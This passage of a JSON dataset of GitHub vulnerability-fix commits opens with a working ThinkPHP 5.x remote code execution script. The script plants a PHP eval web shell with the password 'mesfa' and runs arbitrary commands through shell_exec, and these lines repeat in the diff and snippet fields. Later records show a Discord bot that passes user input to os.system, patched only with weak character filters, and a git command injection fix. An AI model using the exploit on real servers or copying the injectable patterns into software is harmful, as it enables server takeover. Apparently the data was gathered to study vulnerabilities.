url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'","    resp = requests.get(taget_url)","    if resp.status_code==200:","        print(\"[+]\"+url+\"\/MS.php   Pass:mesfa\")","def getcode_run(url,cmd):","    taget_url = url+ r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd","    resp = requests.get(taget_url)","    print(resp.text)","def help():","    print('''","    python3 thinkphp.py target_url verify","    python3 thinkphp.py target_url getshell","    python3 thinphp.py target_url -c cmd ","    ''')","    if args[2] == 'verify':","        verify(taget_url)","    if args[2] == 'getshell':","        get_shell(args[1])","    if args[2] =='-c':","        getcode_run(args[1],args[3])","    if args[2]=='-h':","        help()"]},{"diff":"\n #coding:utf-8\n import sys\n-import requests,re\n-#index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n+import requests\n def verify(target_url):\n     headers = {\n         'User_Agent':'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/104.0.0.0 Safari\/537.36'\n     }\n     resp = requests.get(target_url,headers=headers)\n-    with open(\"phpinfo.html\",'wb') as f:\n-        f.write(resp.content)\n+    if \"SERVER_ADDR\" in resp.content.decode():\n+        print(\"\u68c0\u6d4b\u5230\u6f0f\u6d1e\")\n+        with open(\"phpinfo.html\", 'wb') as f:\n+            f.write(resp.content)\n+def get_shell(url):\n+    taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'\n+    resp = requests.get(taget_url)\n+    if resp.status_code==200:\n+        print(\"[+]\"+url+\"\/MS.php   Pass:mesfa\")\n+def getcode_run(url,cmd):\n+    taget_url = url+ r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd\n+    resp = requests.get(taget_url)\n+    print(resp.text)\n+    # html = etree.HTML(resp.text)\n+    # print(html)\n+    # print(html.xpath('\/html\/body\/text()'))\n+def help():\n+    print('''\n+    #\u9a8c\u8bc1\u6f0f\u6d1e\n+    python3 thinkphp.py target_url verify\n+    #getshell\n+    python3 thinkphp.py target_url getshell\n+    #\u547d\u4ee4\u6267\u884c\n+    python3 thinphp.py target_url -c cmd \n+    ''')\n if __name__ == '__main__':\n     args = sys.argv\n     url = args[1]\n     taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'\n-    verify(taget_url)\n\\ No newline at end of file\n+    if args[2] == 'verify':\n+        verify(taget_url)\n+    if args[2] == 'getshell':\n+        get_shell(args[1])\n+    if args[2] =='-c':\n+        getcode_run(args[1],args[3])\n+    if args[2]=='-h':\n+        help()\n\\ No newline at end of file\n","add":34,"remove":5,"filename":"\/src\/request\/thinkphp5.0.20.py","badparts":["import requests,re","    with open(\"phpinfo.html\",'wb') as f:","        f.write(resp.content)","    verify(taget_url)"],"goodparts":["import requests","    if \"SERVER_ADDR\" in resp.content.decode():","        print(\"\u68c0\u6d4b\u5230\u6f0f\u6d1e\")","        with open(\"phpinfo.html\", 'wb') as f:","            f.write(resp.content)","def get_shell(url):","    taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'","    resp = requests.get(taget_url)","    if resp.status_code==200:","        print(\"[+]\"+url+\"\/MS.php   Pass:mesfa\")","def getcode_run(url,cmd):","    taget_url = url+ r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd","    resp = requests.get(taget_url)","    print(resp.text)","def help():","    print('''","    python3 thinkphp.py target_url verify","    python3 thinkphp.py target_url getshell","    python3 thinphp.py target_url -c cmd ","    ''')","    if args[2] == 'verify':","        verify(taget_url)","    if args[2] == 'getshell':","        get_shell(args[1])","    if args[2] =='-c':","        getcode_run(args[1],args[3])","    if args[2]=='-h':","        help()"]}],"source":"\n\nimport sys import requests,re def verify(target_url): headers={ 'User_Agent':'Mozilla\/5.0(Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36(KHTML, like Gecko) Chrome\/104.0.0.0 Safari\/537.36' } resp=requests.get(target_url,headers=headers) with open(\"phpinfo.html\",'wb') as f: f.write(resp.content) if __name__=='__main__': args=sys.argv url=args[1] taget_url=url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1' verify(taget_url) ","sourceWithComments":"#coding:utf-8\nimport sys\nimport requests,re\n#index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\ndef verify(target_url):\n    headers = {\n        'User_Agent':'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/104.0.0.0 Safari\/537.36'\n    }\n    resp = requests.get(target_url,headers=headers)\n    with open(\"phpinfo.html\",'wb') as f:\n        f.write(resp.content)\nif __name__ == '__main__':\n    args = sys.argv\n    url = args[1]\n    taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'\n    verify(taget_url)"}},"msg":"Thinkphp5 5.0.22\/5.1.29 Remote Code Execution Vulnerability"}},"https:\/\/github.com\/Evanzap\/joebot":{"acff62dcdaba2023d53318ef413b7f57d65dc896":{"url":"https:\/\/api.github.com\/repos\/Evanzap\/joebot\/commits\/acff62dcdaba2023d53318ef413b7f57d65dc896","html_url":"https:\/\/github.com\/Evanzap\/joebot\/commit\/acff62dcdaba2023d53318ef413b7f57d65dc896","message":"Fixed security vulnerabilities!\n\n- Fixed major security vulnerability in wget and rename which allowed remote code execution.\r\n- Changed version number to 6.4.2.","sha":"acff62dcdaba2023d53318ef413b7f57d65dc896","keyword":"remote code execution vulnerable","diff":"diff --git a\/the.py b\/the.py\nindex 429c334..0e7202b 100644\n--- a\/the.py\n+++ b\/the.py\n@@ -86,7 +86,7 @@ async def takehelp(ctx, member : discord.Member):\n \r\n @bot.command(help=\"Displays information about the bot.\", )\r\n async def about(ctx):\r\n-    await ctx.send('Joe Bot Version v6.4.1')\r\n+    await ctx.send('Joe Bot Version v6.4.2')\r\n     await ctx.send('--------------------------------')\r\n     await ctx.send('This is a JOE Bot, all hail Joe!')\r\n     await ctx.send('Contributors: JoshuaMV')\r\n@@ -116,6 +116,14 @@ async def pickfurry(ctx, *args):\n @bot.command(help=\"Downloads an image to the furry folder.\")\r\n async def wget(ctx, *args):\r\n     arguments=' '.join(args)\r\n+    if \"$\" in arguments:\r\n+        print(\"! User tried to download file from URL with illegal characters.\")\r\n+        await ctx.send(\"This URL contains characters you cannot use!\")\r\n+        return\r\n+    if \"..\" in arguments:\r\n+        print(\"! User tried to download file from URL with illegal characters.\")\r\n+        await ctx.send(\"This URL contains characters you cannot use!\")\r\n+        return\r\n     print(\"User is downloading\",arguments,\"to \/FURRY.\")\r\n     await ctx.send(\"Downloading to the furry folder.\")\r\n     wgettable = [\"wget --directory-prefix \/FURRY\",\" \",arguments]\r\n@@ -132,6 +140,22 @@ async def ls(ctx):\n async def rename(ctx, arg1, arg2):\r\n     source = ''.join(arg1)\r\n     destination = ''.join(arg2)\r\n+    if \"$\" in source:\r\n+        print(\"! User tried to rename file with illegal characters.\")\r\n+        await ctx.send(\"This original filename contains characters you cannot use!\")\r\n+        return\r\n+    if \"$\" in destination:\r\n+        print(\"! User tried to rename file to name with illegal characters.\")\r\n+        await ctx.send(\"This destination filename contains characters you cannot use!\")\r\n+        return\r\n+    if \"..\" in destination:\r\n+        print(\"! User tried to rename file to name with illegal characters.\")\r\n+        await ctx.send(\"This destination filename contains characters you cannot use!\")\r\n+        return\r\n+    if \"..\" in source:\r\n+        print(\"! User tried to rename file with illegal characters.\")\r\n+        await ctx.send(\"This original filename contains characters you cannot use!\")\r\n+        return\r\n     print(\"User is renaming\",source,\"to\", destination,\".\")\r\n     await ctx.send(\"Renaming file.\")\r\n     renametable = [\"mv \",\"\/FURRY\/\",source,\" \",\"\/FURRY\/\",destination]\r\n","files":{"\/the.py":{"changes":[{"diff":"\n \r\n @bot.command(help=\"Displays information about the bot.\", )\r\n async def about(ctx):\r\n-    await ctx.send('Joe Bot Version v6.4.1')\r\n+    await ctx.send('Joe Bot Version v6.4.2')\r\n     await ctx.send('--------------------------------')\r\n     await ctx.send('This is a JOE Bot, all hail Joe!')\r\n     await ctx.send('Contributors: JoshuaMV')\r\n","add":1,"remove":1,"filename":"\/the.py","badparts":["    await ctx.send('Joe Bot Version v6.4.1')\r"],"goodparts":["    await ctx.send('Joe Bot Version v6.4.2')\r"]},{"diff":"\n \r\n @bot.command(help=\"Displays information about the bot.\", )\r\n async def about(ctx):\r\n-    await ctx.send('Joe Bot Version v6.4.1')\r\n+    await ctx.send('Joe Bot Version v6.4.2')\r\n     await ctx.send('--------------------------------')\r\n     await ctx.send('This is a JOE Bot, all hail Joe!')\r\n     await ctx.send('Contributors: JoshuaMV')\r\n","add":1,"remove":1,"filename":"\/the.py","badparts":["    await ctx.send('Joe Bot Version v6.4.1')\r"],"goodparts":["    await ctx.send('Joe Bot Version v6.4.2')\r"]}],"source":"\nimport discord\r import random\r from discord.ext import commands\r import os\r import sys\r import psutil\r import logging\r import time\r import string\r import git\r from git import Repo\r \r intents=discord.Intents.default()\r intents.message_content=True\r bot=commands.Bot(command_prefix='.', intents=intents)\r token_file=open('token.txt', 'r')\r token=token_file.read()\r \r def arestart():\r import sys\r print(\"argv was\",sys.argv)\r print(\"sys.executable was\", sys.executable)\r print(\"restart now\")\r \r def restartApp():\r print(\"Restarting the bot!\")\r python=sys.executable\r os.execl(python, python, *sys.argv)\r \r @bot.command(help='Displays Rule 11')\r async def r11(ctx):\r await ctx.send('Please refrain from asking for or giving assistance with installing, using, or obtaining pirated software.')\r print(\"Somebody called rule 11.\")\r \r @bot.command(help='Displays Rule 11')\r async def rule11(ctx):\r await ctx.send('Please refrain from asking for or giving assistance with installing, using, or obtaining pirated software.')\r print(\"Somebody called rule 11.\")\r \r @bot.command(help=\"dispways wuwe 11\")\r async def wuwe11(ctx):\r await ctx.send('pwease wefwain fwom asking fow ow giving assistance with instawwing, using, ow obtaining piwated softwawe')\r print(\"Somebody cawwed wuwe 11. UwU\")\r \r @bot.command(help=\"dispways wuwe 11\")\r async def w11(ctx):\r await ctx.send('pwease wefwain fwom asking fow ow giving assistance with instawwing, using, ow obtaining piwated softwawe')\r print(\"Somebody cawwed wuwe 11. UwU\")\r \r @bot.command(help=\"Bans a member.\")\r async def ban(ctx, member: discord.Member):\r if member.name=='Joe Bot':\r await ctx.send('no')\r else:\r thing=[':hammer: ', member.mention, ' has been banned.']\r x=''.join(thing)\r await ctx.send(x)\r print(member.mention,\"was banned.\")\r \r @bot.command(help=\"Kills a member.\")\r async def kill(ctx, member: discord.Member):\r if member.name=='Joe Bot':\r await ctx.send('no')\r else:\r thing=[':knife: ', member.mention, ' has been killed.']\r x=''.join(thing)\r await ctx.send(x)\r print(member.mention,\"was killed.\")\r \r @bot.command(help=\"Super bans a member.\")\r async def superban(ctx, member: discord.Member):\r if member.name=='Joe Bot':\r await ctx.send('no')\r else:\r thing=[member.mention, ' is now SUPER BANNED.:thumbup: https:\/\/nintendohomebrew.com\/assets\/img\/banned.gif']\r x=''.join(thing)\r await ctx.send(x)\r print(member.mention,\"is now SUPER BANNED!\")\r \r @bot.command(help=\"Takes away help from a member.\")\r async def takehelp(ctx, member: discord.Member):\r thing=[member.mention, ' can no longer access the help channels.']\r x=''.join(thing)\r await ctx.send(x)\r print(\"Someone took help from\",member.mention,\".\")\r \r @bot.command(help=\"Displays information about the bot.\",)\r async def about(ctx):\r await ctx.send('Joe Bot Version v6.4.1')\r await ctx.send('--------------------------------')\r await ctx.send('This is a JOE Bot, all hail Joe!')\r await ctx.send('Contributors: JoshuaMV')\r print(\"Someone called the about message.\")\r \r @bot.command(help=\"idk\", pass_context=True)\r async def furry(ctx):\r area=ctx.message.channel\r await ctx.send(file=discord.File(r'\/Users\/Evanz\/real.png'))\r \r @bot.command(help=\"Sends a random image from Evan's furry folder.\")\r async def furryfolder(ctx):\r furryfile=random.choice(os.listdir(\"\/FURRY\"))\r furrytable=[\"\/FURRY\/\",furryfile]\r furrysend=''.join(furrytable)\r await ctx.send(file=discord.File(furrysend))\r print(\"I sent\", furrysend, \"from the \/FURRY directory.\")\r \t\r @bot.command(help=\"Sends a chosen image from the furry folder.\")\r async def pickfurry(ctx, *args):\r furryfile=''.join(args)\r furrytable=[\"\/FURRY\/\",furryfile]\r furrysend=''.join(furrytable)\r await ctx.send(file=discord.File(furrysend))\r print(\"I sent\", furrysend, \"from the \/FURRY directory.\")\r \r @bot.command(help=\"Downloads an image to the furry folder.\")\r async def wget(ctx, *args):\r arguments=' '.join(args)\r print(\"User is downloading\",arguments,\"to \/FURRY.\")\r await ctx.send(\"Downloading to the furry folder.\")\r wgettable=[\"wget --directory-prefix \/FURRY\",\" \",arguments]\r os.system(''.join(wgettable))\r print(\"User downloaded\",arguments,\"to \/FURRY.\")\r await ctx.send(\"Finished downloading to the furry folder.\")\r \r @bot.command(help=\"Lists the contents of the furry folder.\")\r async def ls(ctx):\r print(\"User is requesting the contents of the furry folder.\")\r await ctx.send(''.join([\"Furry Directory Listing:( \",')( '.join(os.listdir('\/FURRY')),\")\"]))\r \r @bot.command(help=\"Renames a file in the furry folder.\")\r async def rename(ctx, arg1, arg2):\r source=''.join(arg1)\r destination=''.join(arg2)\r print(\"User is renaming\",source,\"to\", destination,\".\")\r await ctx.send(\"Renaming file.\")\r renametable=[\"mv \",\"\/FURRY\/\",source,\" \",\"\/FURRY\/\",destination]\r os.system(''.join(renametable))\r await ctx.send(\"File renamed.\")\r \r @bot.command(help=\"Sends a random LightShot image.(Use at your own risk!)\")\r async def lightshot(ctx):\r lslink=''.join(random.choices(string.ascii_lowercase +string.digits, k=6))\r lstable=[\"https:\/\/prnt.sc\/\", lslink]\r lssend=''.join(lstable)\r await ctx.send(lssend)\r print(\"I sent a lightshot link, that being\",lssend,\".\")\r \r @bot.command(help=\"Make the Joe Bot say what you want it to!\")\r async def say(ctx, *args):\r arguments=' '.join(args)\r await ctx.send(arguments)\r print(\"Someone asked me to say something.:\",arguments)\r \r @bot.command(help=\"Birb image.\")\r async def birb(ctx):\r await ctx.send('https:\/\/files.catbox.moe\/s1g67r.png')\r print(\"I sent the funny birb image.\")\r \r @bot.command(help='Update the bot via GIT.')\r async def update(ctx):\r \tos.system(\"rm -rf \/root\/test\/\")\r \tos.system(\"mkdir \/root\/test\/\")\r \tRepo.clone_from(\"https:\/\/www.github.com\/Evanzap\/joebot.git\", \"\/root\/test\/\")\r \tos.system(\"mv \/root\/test\/the.py \/root\/the.py\")\r \tawait ctx.send('Updating software, please type.restart after a few seconds.')\r \t\r @bot.command(help='Restart the bot after updating')\r async def restart(ctx):\r \tctx.send('Restarting...')\r \trestartApp()\r \r bot.run(str(token))\r ","sourceWithComments":"import discord\r\nimport random\r\nfrom discord.ext import commands\r\nimport os\r\nimport sys\r\nimport psutil\r\nimport logging\r\nimport time\r\nimport string\r\nimport git\r\nfrom git import Repo\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\nbot = commands.Bot(command_prefix='.', intents=intents)\r\ntoken_file = open('token.txt', 'r')\r\ntoken = token_file.read()\r\n\r\ndef arestart():\r\n    import sys\r\n    print(\"argv was\",sys.argv)\r\n    print(\"sys.executable was\", sys.executable)\r\n    print(\"restart now\")\r\n\r\ndef restartApp():\r\n    print(\"Restarting the bot!\")\r\n    python = sys.executable\r\n    os.execl(python, python, *sys.argv)\r\n\r\n@bot.command(help='Displays Rule 11')\r\nasync def r11(ctx):\r\n    await ctx.send('Please refrain from asking for or giving assistance with installing, using, or obtaining pirated software.')\r\n    print(\"Somebody called rule 11.\")\r\n\r\n@bot.command(help='Displays Rule 11')\r\nasync def rule11(ctx):\r\n    await ctx.send('Please refrain from asking for or giving assistance with installing, using, or obtaining pirated software.')\r\n    print(\"Somebody called rule 11.\")\r\n\r\n@bot.command(help=\"dispways wuwe 11\")\r\nasync def wuwe11(ctx):\r\n    await ctx.send('pwease wefwain fwom asking fow ow giving assistance with instawwing, using, ow obtaining piwated softwawe')\r\n    print(\"Somebody cawwed wuwe 11. UwU\")\r\n\r\n@bot.command(help=\"dispways wuwe 11\")\r\nasync def w11(ctx):\r\n    await ctx.send('pwease wefwain fwom asking fow ow giving assistance with instawwing, using, ow obtaining piwated softwawe')\r\n    print(\"Somebody cawwed wuwe 11. UwU\")\r\n\r\n@bot.command(help=\"Bans a member.\")\r\nasync def ban(ctx, member : discord.Member):\r\n    if member.name == 'Joe Bot':\r\n        await ctx.send('no')\r\n    else:\r\n        thing = [':hammer: ', member.mention, ' has been banned.']\r\n        x = ''.join(thing)\r\n        await ctx.send(x)\r\n        print(member.mention,\"was banned.\")\r\n\r\n@bot.command(help=\"Kills a member.\")\r\nasync def kill(ctx, member : discord.Member):\r\n    if member.name == 'Joe Bot':\r\n        await ctx.send('no')\r\n    else:\r\n        thing = [':knife: ', member.mention, ' has been killed.']\r\n        x = ''.join(thing)\r\n        await ctx.send(x)\r\n        print(member.mention,\"was killed.\")\r\n\r\n@bot.command(help=\"Super bans a member.\")\r\nasync def superban(ctx, member : discord.Member):\r\n    if member.name == 'Joe Bot':\r\n        await ctx.send('no')\r\n    else:\r\n        thing = [member.mention, ' is now SUPER BANNED. :thumbup: https:\/\/nintendohomebrew.com\/assets\/img\/banned.gif']\r\n        x = ''.join(thing)\r\n        await ctx.send(x)\r\n        print(member.mention,\"is now SUPER BANNED!\")\r\n\r\n@bot.command(help=\"Takes away help from a member.\")\r\nasync def takehelp(ctx, member : discord.Member):\r\n        thing = [member.mention, ' can no longer access the help channels.']\r\n        x = ''.join(thing)\r\n        await ctx.send(x)\r\n        print(\"Someone took help from\",member.mention,\".\")\r\n\r\n@bot.command(help=\"Displays information about the bot.\", )\r\nasync def about(ctx):\r\n    await ctx.send('Joe Bot Version v6.4.1')\r\n    await ctx.send('--------------------------------')\r\n    await ctx.send('This is a JOE Bot, all hail Joe!')\r\n    await ctx.send('Contributors: JoshuaMV')\r\n    print(\"Someone called the about message.\")\r\n\r\n@bot.command(help=\"idk\", pass_context=True)\r\nasync def furry(ctx):\r\n    area = ctx.message.channel\r\n    await ctx.send(file=discord.File(r'\/Users\/Evanz\/real.png'))\r\n\r\n@bot.command(help=\"Sends a random image from Evan's furry folder.\")\r\nasync def furryfolder(ctx):\r\n    furryfile = random.choice(os.listdir(\"\/FURRY\"))\r\n    furrytable = [\"\/FURRY\/\",furryfile]\r\n    furrysend = ''.join(furrytable)\r\n    await ctx.send(file=discord.File(furrysend))\r\n    print(\"I sent\", furrysend, \"from the \/FURRY directory.\")\r\n\t\r\n@bot.command(help=\"Sends a chosen image from the furry folder.\")\r\nasync def pickfurry(ctx, *args):\r\n    furryfile = ''.join(args)\r\n    furrytable = [\"\/FURRY\/\",furryfile]\r\n    furrysend = ''.join(furrytable)\r\n    await ctx.send(file=discord.File(furrysend))\r\n    print(\"I sent\", furrysend, \"from the \/FURRY directory.\")\r\n\r\n@bot.command(help=\"Downloads an image to the furry folder.\")\r\nasync def wget(ctx, *args):\r\n    arguments=' '.join(args)\r\n    print(\"User is downloading\",arguments,\"to \/FURRY.\")\r\n    await ctx.send(\"Downloading to the furry folder.\")\r\n    wgettable = [\"wget --directory-prefix \/FURRY\",\" \",arguments]\r\n    os.system(''.join(wgettable))\r\n    print(\"User downloaded\",arguments,\"to \/FURRY.\")\r\n    await ctx.send(\"Finished downloading to the furry folder.\")\r\n\r\n@bot.command(help=\"Lists the contents of the furry folder.\")\r\nasync def ls(ctx):\r\n    print(\"User is requesting the contents of the furry folder.\")\r\n    await ctx.send(''.join([\"Furry Directory Listing: ( \",' )( '.join(os.listdir('\/FURRY')),\" )\"]))\r\n\r\n@bot.command(help=\"Renames a file in the furry folder.\")\r\nasync def rename(ctx, arg1, arg2):\r\n    source = ''.join(arg1)\r\n    destination = ''.join(arg2)\r\n    print(\"User is renaming\",source,\"to\", destination,\".\")\r\n    await ctx.send(\"Renaming file.\")\r\n    renametable = [\"mv \",\"\/FURRY\/\",source,\" \",\"\/FURRY\/\",destination]\r\n    os.system(''.join(renametable))\r\n    await ctx.send(\"File renamed.\")\r\n\r\n@bot.command(help=\"Sends a random LightShot image. (Use at your own risk!)\")\r\nasync def lightshot(ctx):\r\n    lslink = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))\r\n    lstable = [\"https:\/\/prnt.sc\/\", lslink]\r\n    lssend = ''.join(lstable)\r\n    await ctx.send(lssend)\r\n    print(\"I sent a lightshot link, that being\",lssend,\".\")\r\n\r\n@bot.command(help=\"Make the Joe Bot say what you want it to!\")\r\nasync def say(ctx, *args):\r\n    arguments = ' '.join(args)\r\n    await ctx.send(arguments)\r\n    print(\"Someone asked me to say something.:\",arguments)\r\n\r\n@bot.command(help=\"Birb image.\")\r\nasync def birb(ctx):\r\n    await ctx.send('https:\/\/files.catbox.moe\/s1g67r.png')\r\n    print(\"I sent the funny birb image.\")\r\n\r\n@bot.command(help='Update the bot via GIT.')\r\nasync def update(ctx):\r\n\tos.system(\"rm -rf \/root\/test\/\")\r\n\tos.system(\"mkdir \/root\/test\/\")\r\n\tRepo.clone_from(\"https:\/\/www.github.com\/Evanzap\/joebot.git\", \"\/root\/test\/\")\r\n\tos.system(\"mv \/root\/test\/the.py \/root\/the.py\")\r\n\tawait ctx.send('Updating software, please type .restart after a few seconds.')\r\n\t\r\n@bot.command(help='Restart the bot after updating')\r\nasync def restart(ctx):\r\n\tctx.send('Restarting...')\r\n\trestartApp()\r\n\r\nbot.run(str(token))\r\n"}},"msg":"Fixed security vulnerabilities!\n\n- Fixed major security vulnerability in wget and rename which allowed remote code execution.\r\n- Changed version number to 6.4.2."}},"https:\/\/github.com\/NobisIndustries\/GitInsight":{"455d1933731f68855cf0011aed5f64d813faa07e":{"url":"https:\/\/api.github.com\/repos\/NobisIndustries\/GitInsight\/commits\/455d1933731f68855cf0011aed5f64d813faa07e","html_url":"https:\/\/github.com\/NobisIndustries\/GitInsight\/commit\/455d1933731f68855cf0011aed5f64d813faa07e","message":"Fix potential remote code execution vulnerability","sha":"455d1933731f68855cf0011aed5f64d813faa07e","keyword":"remote code execution vulnerable","diff":"diff --git a\/backend\/queries\/main_queries.py b\/backend\/queries\/main_queries.py\nindex b4b5869..ef206ff 100644\n--- a\/backend\/queries\/main_queries.py\n+++ b\/backend\/queries\/main_queries.py\n@@ -62,13 +62,17 @@ def filter_for_commits_in_branch(self, data: pd.DataFrame, branch: str):\n     @cache(limit=10)\n     def _get_hashes_in_branch(self, branch: str) -> List[str]:\n         repo = git.Repo(REPO_PATH)\n-        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()\n+        branch = f'origin\/{branch}'\n+        available_branches = [ref.name for ref in repo.remotes[0].refs]\n+        if branch not in available_branches:\n+            raise ValueError(f'Branch \"{branch}\" is invalid.')\n+        return repo.git.execute(f'git log \"{branch}\" --pretty=format:%H').splitlines()\n \n \n class Queries:\n     def __init__(self):\n         db_session = db.get_session()\n-        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())\n+        author_info_provider = AuthorInfoProvider()\n         branch_info_provider = BranchInfoProvider()\n \n         self.general_info = GeneralInfoQueries(db_session)\ndiff --git a\/backend\/repo_management\/git_crawler.py b\/backend\/repo_management\/git_crawler.py\nindex 50c02f5..9b5153c 100644\n--- a\/backend\/repo_management\/git_crawler.py\n+++ b\/backend\/repo_management\/git_crawler.py\n@@ -194,9 +194,7 @@ def __get_latest_commits_of_branches(self, limit_tracked_branches_days_last_acti\n         return commit_hash_of_branch\n \n     def __get_repo_branches(self):\n-        branches_raw = self._repo.git.execute('git branch -r')\n-        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]\n-        return branches\n+        return [ref.name for ref in self._repo.remotes[0].refs]\n \n     def __clean_origin_branch_name(self, branch_name):\n         # We use the branches available from the origin remote repo, but want to present them\n","files":{"\/backend\/queries\/main_queries.py":{"changes":[{"diff":"\n     @cache(limit=10)\n     def _get_hashes_in_branch(self, branch: str) -> List[str]:\n         repo = git.Repo(REPO_PATH)\n-        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()\n+        branch = f'origin\/{branch}'\n+        available_branches = [ref.name for ref in repo.remotes[0].refs]\n+        if branch not in available_branches:\n+            raise ValueError(f'Branch \"{branch}\" is invalid.')\n+        return repo.git.execute(f'git log \"{branch}\" --pretty=format:%H').splitlines()\n \n \n class Queries:\n     def __init__(self):\n         db_session = db.get_session()\n-        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())\n+        author_info_provider = AuthorInfoProvider()\n         branch_info_provider = BranchInfoProvider()\n \n         self.general_info = GeneralInfoQueries(db_session)","add":6,"remove":2,"filename":"\/backend\/queries\/main_queries.py","badparts":["        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()","        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())"],"goodparts":["        branch = f'origin\/{branch}'","        available_branches = [ref.name for ref in repo.remotes[0].refs]","        if branch not in available_branches:","            raise ValueError(f'Branch \"{branch}\" is invalid.')","        return repo.git.execute(f'git log \"{branch}\" --pretty=format:%H').splitlines()","        author_info_provider = AuthorInfoProvider()"]},{"diff":"\n     @cache(limit=10)\n     def _get_hashes_in_branch(self, branch: str) -> List[str]:\n         repo = git.Repo(REPO_PATH)\n-        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()\n+        branch = f'origin\/{branch}'\n+        available_branches = [ref.name for ref in repo.remotes[0].refs]\n+        if branch not in available_branches:\n+            raise ValueError(f'Branch \"{branch}\" is invalid.')\n+        return repo.git.execute(f'git log \"{branch}\" --pretty=format:%H').splitlines()\n \n \n class Queries:\n     def __init__(self):\n         db_session = db.get_session()\n-        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())\n+        author_info_provider = AuthorInfoProvider()\n         branch_info_provider = BranchInfoProvider()\n \n         self.general_info = GeneralInfoQueries(db_session)","add":6,"remove":2,"filename":"\/backend\/queries\/main_queries.py","badparts":["        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()","        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())"],"goodparts":["        branch = f'origin\/{branch}'","        available_branches = [ref.name for ref in repo.remotes[0].refs]","        if branch not in available_branches:","            raise ValueError(f'Branch \"{branch}\" is invalid.')","        return repo.git.execute(f'git log \"{branch}\" --pretty=format:%H').splitlines()","        author_info_provider = AuthorInfoProvider()"]}],"source":"\nfrom typing import List, Iterable import git import pandas as pd import db_schema as db from caching.caching_decorator import cache from configs import AuthorInfoConfig from helpers.path_helpers import REPO_PATH from queries.sub_queries.file_operation_queries import FileOperationQueries from queries.sub_queries.general_info_queries import GeneralInfoQueries from queries.sub_queries.repo_overview_queries import RepoOverviewQueries class AuthorInfoProvider: UNKNOWN_PERSON_INFO={ 'team_id': 'UNKNOWN', 'person_image_url': '', 'person_description': '', 'person_contact_link': '' } AUTHOR_COLUMN_NAME=db.SqlCommitMetadata.author.name def __init__(self, author_info: AuthorInfoConfig): self._author_info=author_info def add_info_to_author_names(self, names: Iterable[str]) -> pd.DataFrame: additional_data=[] for name in set(names): person_info=self._author_info.authors.get(name, self.UNKNOWN_PERSON_INFO) team_id=person_info['team_id'] if team_id not in self._author_info.teams: raise ValueError(f'Person \"{name}\" has a team ID of \"{team_id}\" that does not exist.') info={self.AUTHOR_COLUMN_NAME: name} info.update(person_info) info.update(self._author_info.teams[team_id]) additional_data.append(info) return pd.DataFrame(additional_data) def get_all_teams_data(self) -> pd.DataFrame: info=pd.DataFrame(self._author_info.teams).transpose() info['team_name']=info.index info.reset_index(inplace=True, drop=True) return info class BranchInfoProvider: def __init__(self): pass def filter_for_commits_in_branch(self, data: pd.DataFrame, branch: str): \"\"\" Discards commits that do not belong to the given branch. We could do this in SQL, however: -Option 1: Save all branches and their commits into the data base -> with multiple branches the data base quickly gets big fast +writing 100k+entries for each branch takes a long time -Option 2: Provide commit hashes in SQL query -> this is super slow when filtering for 100k+hashes Therefore its much more performant to do commit filtering locally\"\"\" hashes_in_branch=self._get_hashes_in_branch(branch) return data.loc[data.hash.isin(hashes_in_branch)] @cache(limit=10) def _get_hashes_in_branch(self, branch: str) -> List[str]: repo=git.Repo(REPO_PATH) return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines() class Queries: def __init__(self): db_session=db.get_session() author_info_provider=AuthorInfoProvider(AuthorInfoConfig.load()) branch_info_provider=BranchInfoProvider() self.general_info=GeneralInfoQueries(db_session) self.file_operations=FileOperationQueries(db_session, branch_info_provider, author_info_provider) self.overview=RepoOverviewQueries(db_session, branch_info_provider, author_info_provider) if __name__=='__main__': q=Queries() print(q.file_operations.get_history_of_path('Python\/', 'master')) print(q.overview.calculate_loc_vs_edit_counts('master')) ","sourceWithComments":"from typing import List, Iterable\n\nimport git\nimport pandas as pd\n\nimport db_schema as db\nfrom caching.caching_decorator import cache\nfrom 